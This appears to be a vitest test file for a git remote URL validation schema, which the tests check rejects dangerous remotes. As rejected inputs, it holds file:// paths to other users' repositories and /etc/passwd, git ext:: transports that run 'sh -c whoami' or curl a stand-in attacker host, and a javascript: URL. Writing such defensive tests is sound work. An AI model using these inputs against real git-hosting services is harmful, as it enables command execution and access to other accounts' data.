import { describe, it, expect } from 'vitest';
import { gitRemoteUrlSchema } from './git-url.js';

const accepts = (v: string): boolean => gitRemoteUrlSchema.safeParse(v).success;

describe('gitRemoteUrlSchema', () => {
  it.each([
    'https://github.com/owner/repo.git',
    'https://gitlab.example.com/group/sub/repo',
    'http://gitea.lan:3000/owner/repo.git',
    'ssh://git@github.com/owner/repo.git',
    'https://user@host/repo.git',
  ])('accepts %s', (url) => {
    expect(accepts(url)).toBe(true);
  });

  it('refuses a file:// URL', () => {
    // The one that matters. Every account's repositories share one volume, so a
    // file:// remote fetches someone else's work into your own — and no network
    // control sees it happen. MEASURED: `git ls-remote file:///tmp/src` succeeds
    // against any readable repository.
    expect(accepts('file:///var/lib/haive/repos/other-user/other-repo')).toBe(false);
    expect(accepts('file:///etc/passwd')).toBe(false);
    expect(accepts('FILE:///tmp/x')).toBe(false);
  });

  it('refuses git’s command-executing transports', () => {
    // git refuses `ext::` on its own ("transport 'ext' not allowed"), but a
    // property this schema is responsible for must not rest on another tool's
    // default.
    expect(accepts('ext::sh -c whoami')).toBe(false);
    expect(accepts('ext::curl https://attacker.example/x')).toBe(false);
  });

  it.each([
    'javascript:alert(1)',
    'data:text/plain,hi',
    'git://host/repo.git',
    'ftp://host/repo.git',
    'not a url at all',
    '',
  ])('refuses %s', (url) => {
    expect(accepts(url)).toBe(false);
  });

  it('cannot produce a hostless https URL, which is why the host check is for file:', () => {
    // Surprising, and worth recording so nobody deletes the host check as dead:
    // for a SPECIAL scheme the WHATWG parser cannot yield an empty host — it
    // normalises `https:///repo.git` to the host `repo.git`. The check earns its
    // place on the other side, where `file:///path` genuinely parses with no
    // host at all.
    expect(new URL('https:///repo.git').hostname).toBe('repo.git');
    expect(accepts('https:///repo.git')).toBe(true);
    expect(new URL('file:///etc/passwd').hostname).toBe('');
  });

  it('refuses scp-style addresses rather than silently mangling them', () => {
    // `git@github.com:owner/repo.git` is not a URL. It is the most common way to
    // write a git remote by hand, so the failure has to SAY that — the message
    // names it — instead of being a generic "invalid url".
    const result = gitRemoteUrlSchema.safeParse('git@github.com:owner/repo.git');
    expect(result.success).toBe(false);
    if (!result.success) expect(result.error.issues[0]?.message).toContain('scp-style');
  });

  it('trims surrounding whitespace, which a paste carries in', () => {
    expect(accepts('  https://github.com/owner/repo.git  ')).toBe(true);
  });

  it('bounds the length', () => {
    expect(accepts(`https://host/${'a'.repeat(3000)}`)).toBe(false);
  });
});
